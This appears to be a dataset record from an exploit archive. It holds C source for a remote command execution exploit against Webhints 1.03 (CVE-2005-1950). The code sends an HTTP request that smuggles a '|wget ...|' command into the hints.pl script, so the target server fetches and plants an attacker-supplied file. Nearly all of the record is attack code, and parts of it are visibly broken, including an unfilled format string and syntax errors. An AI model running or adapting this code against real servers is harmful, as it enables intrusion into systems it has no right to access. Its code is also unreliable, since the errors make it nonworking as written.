{
  "id": "1040",
  "title": "Webhints 1.03 - Remote Command Execution (C) (2)",
  "cve": "CVE-2005-1950",
  "vuln_type": "file_upload",
  "code": "/*\r\n**************************************************************************************\r\n*        T r a p - S e t   U n d e r g r o u n d   H a c k i n g   T e a m           *\r\n**************************************************************************************\r\n EXPLOIT FOR :  WebHints Remote C0mmand Execution Vuln\r\n\r\nCoded By: A l p h a _ P r o g r a m m e r  (Sirus-v)\r\nE-Mail: Alpha_Programmer@Yahoo.Com\r\n\r\nThis Xpl Upload a Page in Vulnerable Directory , You can Change This Code For Yourself\r\n\r\n**************************************************************************************\r\n* GR33tz T0 ==>     mh_p0rtal  --  oil_Karchack  --  The-CephaleX  -- Str0ke         *\r\n*And Iranian Security & Technical Sites:                                             *\r\n*                                                                                    *\r\n*         TechnoTux.Com , IranTux.Com , Iranlinux.ORG , Barnamenevis.ORG             *\r\n*      Crouz ,  Simorgh-ev   , IHSsecurity , AlphaST , Shabgard &  GrayHatz.NeT      *\r\n**************************************************************************************\r\n*/\r\n#include <string.h>\r\n#include <stdlib.h>\r\n#include <stdio.h>\r\n#pragma comment(lib, \"ws2_32.lib\")\r\n#include <winsock2.h>\r\n\r\n\r\n#define MY_PORT 80\r\n#define BUF_LEN 256\r\n/**************************************************************************************/\r\nint main(int arg_c, char *arg_v[])\r\n{\r\n       static const char cmd[] = \"GET %chints.pl?|wget %c| HTTP/1.0\\r\\n\\r\\n\" , arg_v[2] , arg_v[3];\r\n\r\n       struct sockaddr_in their_adr;\r\n       char buf[BUF_LEN];\r\n       struct hostent *he;\r\n       int sock, i;\r\n       WSADATA wsdata;\r\n\r\n/* Winsock start up */\r\n       WSAStartup(0x0101, &wsdata);\r\n       atexit((void (*)(void))WSACleanup);\r\n\r\n       if(arg_c != 3)\r\n       {\r\n               printf(\"=========================================================\\n\");\r\n               printf(\"  Webhints Exploit By Alpha_Programmer\\n\");\r\n               printf(\"   Trap-set Underground Hacking Team\\n\");\r\n               printf(\"   Usage : webhints.exe [Targ3t] [DIR] [File Address]\\n\");\r\n               printf(\"=========================================================\\n\");\r\n               return 1;\r\n       }\r\n/* create socket */\r\nprintf(\"calling socket()...\\n\");\r\n       sock = socket(AF_INET, SOCK_STREAM, 0);\r\n\r\n/* get IP address of other end */\r\nprintf(\"calling gethostbyname()...\\n\");\r\n       he = gethostbyname(arg_v[1]);\r\n       if(he == NULL)\r\n       {\r\n               printf(\"can't get IP address of host '%s'\\n\", arg_v[1]);\r\n               return 1;\r\n       }\r\n       memset(&their_adr, 0, sizeof(their_adr));\r\n       their_adr.sin_family = AF_INET;\r\n       memcpy(&their_adr.sin_addr, he->h_addr, he->h_length);\r\n       their_adr.sin_port = htons(MY_PORT);\r\n/* connect */\r\nprintf(\"C0nnecting...\\n\");\r\n       i = connect(sock, (struct sockaddr *)&their_adr, sizeof(their_adr));\r\n       if(i != 0)\r\n       {\r\n               printf(\"C0nnect() returned %d, errno=%d\\n\", i, errno);\r\n               return 1;\r\n       }\r\n/* send H3ll C0mmand */\r\nprintf(\"Sending H3ll Packets...\\n\");\r\n       i = send(sock, cmd, sizeof(cmd), 0);\r\n       if(i != sizeof(cmd))\r\n       {\r\n               printf(\"Send. returned %d, errno=%d\\n\", i, errno);\r\n               return 1;\r\n       }\\n\r\n               printf(\"OK ... Now You Can Test your file in hints.pl Directory\\n\"):\r\n\r\n       closesocket(sock);\r\n       return 0;\r\n}\r\n\r\n// milw0rm.com [2005-06-11]",
  "url": "https://www.exploit-db.com/exploits/1040"
}